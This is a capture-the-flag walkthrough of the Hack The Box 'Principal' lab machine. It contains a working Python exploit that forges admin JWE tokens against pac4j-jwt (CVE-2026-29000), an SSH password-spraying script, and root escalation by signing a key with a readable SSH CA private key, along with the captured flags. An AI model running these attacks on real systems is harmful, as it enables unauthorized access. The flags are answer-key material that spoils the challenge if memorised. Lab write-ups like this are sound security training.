# Principal HTB Medium Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.244.220
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 17:19 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Initiating Ping Scan at 17:19
Scanning 10.129.244.220 [4 ports]
Completed Ping Scan at 17:19, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:19
Completed Parallel DNS resolution of 1 host. at 17:19, 0.50s elapsed
Initiating SYN Stealth Scan at 17:19
Scanning 10.129.244.220 [1000 ports]
Discovered open port 22/tcp on 10.129.244.220
Discovered open port 8080/tcp on 10.129.244.220
Completed SYN Stealth Scan at 17:19, 2.06s elapsed (1000 total ports)
Initiating Service scan at 17:19
Scanning 2 services on 10.129.244.220
Completed Service scan at 17:19, 23.01s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.244.220.
Initiating NSE at 17:19
Completed NSE at 17:19, 5.26s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.37s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Nmap scan report for 10.129.244.220
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 29 Jun 2026 10:19:46 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-06-29T10:19:46.989+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Mon, 29 Jun 2026 10:19:45 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 29 Jun 2026 10:19:46 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Mon, 29 Jun 2026 10:19:46 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 29 Jun 2026 10:19:47 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=6/29%Time=6A4246B5%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Mon,\x2029\x20
SF:Jun\x202026\x2010:19:45\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20
SF:pac4j-jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\n
SF:Content-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK
SF:\r\nDate:\x20Mon,\x2029\x20Jun\x202026\x2010:19:46\x20GMT\r\nServer:\x2
SF:0Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTI
SF:ONS\r\nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,220,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:
SF:\x20Mon,\x2029\x20Jun\x202026\x2010:19:46\x20GMT\r\nCache-Control:\x20m
SF:ust-revalidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20ht
SF:tp-equiv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>
SF:\n<title>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<
SF:h2>HTTP\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>UR
SF:I:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>
SF:\n<tr><th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</
SF:body>\n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20
SF:Found\r\nDate:\x20Mon,\x2029\x20Jun\x202026\x2010:19:46\x20GMT\r\nServe
SF:r:\x20Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20
SF:must-revalidate,no-cache,no-store\r\nContent-Type:\x20application/json\
SF:r\n\r\n{\"timestamp\":\"2026-06-29T10:19:46\.989\+00:00\",\"status\":40
SF:4,\"error\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt
SF:%2ebak\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x
SF:20Mon,\x2029\x20Jun\x202026\x2010:19:47\x20GMT\r\nCache-Control:\x20mus
SF:t-revalidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http
SF:-equiv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n
SF:<title>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head
SF:>\n<body>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5
SF:</h2>\n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STA
SF:TUS:</th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20charact
SF:er\x20CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.90 seconds
           Raw packets sent: 1012 (44.504KB) | Rcvd: 1002 (40.076KB)
```
Access to **http://10.129.244.220:8080/login** saw `v1.2.0 | Powered by pac4j`
## Web Exploiting
Searching online saw a related [CVE-2026-29000](https://github.com/advisories/GHSA-pm7g-w2cf-q238):
```python
#!/usr/bin/env python3

"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""

import json

import time

import base64

import requests

from jwcrypto import jwk, jwe

import sys

TARGET = sys.argv[1]

# Step 1: Fetch the RSA public key from JWKS

print("[*] Fetching JWKS...")

resp = requests.get(f"{TARGET}/api/auth/jwks")

jwks_data = resp.json()

key_data = jwks_data['keys'][0]

pub_key = jwk.JWK(**key_data)

print(f"[+] Got RSA public key (kid: {key_data['kid']})")

  

def b64url_encode(data):

return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())

header = b64url_encode(json.dumps({"alg": "none"}).encode())

payload = b64url_encode(json.dumps({

"sub": "admin",

"role": "ROLE_ADMIN",

"iss": "principal-platform",

"iat": now,

"exp": now + 3600

}).encode())

plain_jwt = f"{header}.{payload}."

print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")

# Step 3: Wrap in JWE encrypted with server's RSA public key

jwe_token = jwe.JWE(

plain_jwt.encode(),

recipient=pub_key,

protected=json.dumps({

"alg": "RSA-OAEP-256",

"enc": "A128GCM",

"kid": key_data['kid'],

"cty": "JWT"

})

)

forged_token = jwe_token.serialize(compact=True)

print(f"[+] Forged JWE token created")

# Step 4: Access protected endpoints

headers = {"Authorization": f"Bearer {forged_token}"}

print("\n[*] Accessing /api/dashboard...")

resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)

print(f"[+] Status: {resp.status_code}")

data = resp.json()

print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")

print(f"[+] Token: {forged_token}")
```

```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/principal]
└─$ python3 jwt.py http://10.129.244.220:8080      
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.HFbI3fAmR3NWs2VflUp8pyttksSFglHsfKMouvMYd7bsF0MDY6TJ3R4k_FgCHmDE4C8Or75x6zMH8IRM9th8ZxtmRb8jRTk6J7WOe-XfsFZCc1XueKNQgiM_hrdjxo8LuWEV79vktnQi_2wjCSGPoVFdD3jR9MwA7h7SAo0A5mbFerQtS47QOs9gNfN5MffR6bTZHhHUgPbhGS-6EZDRwyWyUaTy3g-Pr8wIodv4P7XM8swi83-V4iuk9xmqQmySST-eFXXJfCfyo3Ql5VqRAtX7dAJXT7ReThN2fLP4Psbqq26SFsZIIVs6BlN2EQpQB0BSS90tUtubNokxFLfQzQ.VAOa8R-NsWg6q6_m.LcfMdaDMHBejaggyBe7LGka7XrYNFygm1CR8CSWx_FcBbS6ZffMK3GzEFCk3co3HfF6hJHnOozurF2tNVVukDTnVWa1fcwcCnGPfZaQfVvsHNhxR0Vg6d4GbS1_n4ASnIg52OHYeXO8nWm7GQtN4J0M6eah4EuRE62hQRQVcjK_hJ-emJLCe6s1xXucjBXYoxpQmEwJmX_oXmkjcP0oBNTlO.CjLW0vMDuL5_evmKf4L3EQ
```
Use the token as `auth_token` to be logged in and redirected to the dashboard
## Get user flag
Navigated to settings and saw a potential SSH password: `D3pl0y_$$H_Now42!`
Brute-force the correct user with that password:
```python
import paramiko
import socket

# Configuration
SSH_HOST = "10.129.244.220"  # Replace with your server's IP address
SSH_PORT = 22
KNOWN_PASSWORD = "D3pl0y_$$H_Now42!"  # Replace with the password you are testing

# The list of usernames you wish to check
USER_LIST = ["admin", "svc-deploy", "jthompson", "amorales", "bwright", "kkumar", "mwilson", "lzhang"]

def check_ssh_login(username, password):
    client = paramiko.SSHClient()
    
    # Automatically add the server's SSH key if it's not in known_hosts
    # Note: Use with caution on untrusted networks
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Attempt connection
        client.connect(
            hostname=SSH_HOST,
            port=SSH_PORT,
            username=username,
            password=password,
            timeout=5,
            allow_agent=False,
            look_for_keys=False
        )
        # If no exception is thrown, authentication was successful
        return True
    except paramiko.AuthenticationException:
        # Credential mismatch for this user
        return False
    except (socket.timeout, paramiko.SSHException) as e:
        print(f"[!] Connection error testing {username}: {e}")
        return None
    finally:
        client.close()

def main():
    print(f"[*] Starting verification against {SSH_HOST}...\n")
    
    successful_users = []
    
    for user in USER_LIST:
        print(f"[*] Testing user: {user}")
        result = check_ssh_login(user, KNOWN_PASSWORD)
        
        if result is True:
            print(f"[+] SUCCESS: User '{user}' logged in successfully.")
            successful_users.append(user)
        elif result is False:
            print(f"[-] FAILED: Authentication failed for '{user}'.")
            
    print("\n" + "="*40)
    print("[*] Scan Complete.")
    if successful_users:
        print(f"[+] Valid accounts found: {', '.join(successful_users)}")
    else:
        print("[-] No matching user accounts found for this password.")

if __name__ == "__main__":
    main()
```
Result:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/principal]
└─$ python3 ./test_ssh.py                       
[*] Starting verification against 10.129.244.220...

[*] Testing user: admin
[-] FAILED: Authentication failed for 'admin'.
[*] Testing user: svc-deploy
[+] SUCCESS: User 'svc-deploy' logged in successfully.
[*] Testing user: jthompson
[-] FAILED: Authentication failed for 'jthompson'.
[*] Testing user: amorales
[-] FAILED: Authentication failed for 'amorales'.
[*] Testing user: bwright
[-] FAILED: Authentication failed for 'bwright'.
[*] Testing user: kkumar                                            
[-] FAILED: Authentication failed for 'kkumar'.                     
[*] Testing user: mwilson                                           
[-] FAILED: Authentication failed for 'mwilson'.                    
[*] Testing user: lzhang                                            
[-] FAILED: Authentication failed for 'lzhang'.                     
                                                                    
========================================                            
[*] Scan Complete.                                                  
[+] Valid accounts found: svc-deploy                 
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/principal]
└─$ ssh svc-deploy@10.129.244.220       
The authenticity of host '10.129.244.220 (10.129.244.220)' can't be established.
ED25519 key fingerprint is: SHA256:ibvdsZXiwJ6QUMPTxoH3spRA8hV9mbd98MLpLt3XG/E
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.220' (ED25519) to the list of known hosts.
svc-deploy@10.129.244.220's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt
92f4fa8aa4e06414feec83a54c6ebcb9
svc-deploy@principal:~$ 

```

## Privilege Escalation
The user is part of the deployers group and if we enumerate the file system we will find that the
group has access to the /opt/principal/ssh directory.
We immediately notice that we are able to read the SSH CA private key but we also find that
the sshd configuration trusts this CA as indicated in the README file
## Get root flag
```
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
svc-deploy@principal:~$ cd /opt/principal/ssh
svc-deploy@principal:/opt/principal/ssh$ ls -la
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/pwn
Your public key has been saved in /tmp/pwn.pub
The key fingerprint is:
SHA256:1hRB3dmElbAnSVTFp0GDqLe7A0hgmqSfdYPf+URcn34 svc-deploy@principal
The key's randomart image is:
+--[ED25519 256]--+
|         .++.B=O*|
|  . o     ..= Bo+|
| o + o   o.. = =.|
|. o o + .o+   *  |
| . o + +S+.. .   |
|  o   o.+ o   . E|
|         + .   . |
|          +      |
|          .o     |
+----[SHA256]-----+
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from 2026-06-29T10:36:00 to 2026-06-29T11:37:14
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -L -f /tmp/pwn-cert.pub
/tmp/pwn-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:1hRB3dmElbAnSVTFp0GDqLe7A0hgmqSfdYPf+URcn34
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
        Key ID: "pwn-root"
        Serial: 0
        Valid: from 2026-06-29T10:36:00 to 2026-06-29T11:37:14
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
svc-deploy@principal:/opt/principal/ssh$ ssh -i /tmp/pwn root@localhost
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# cat root.txt
69020d9dac47b93d2ff7c27c8d5a387d

```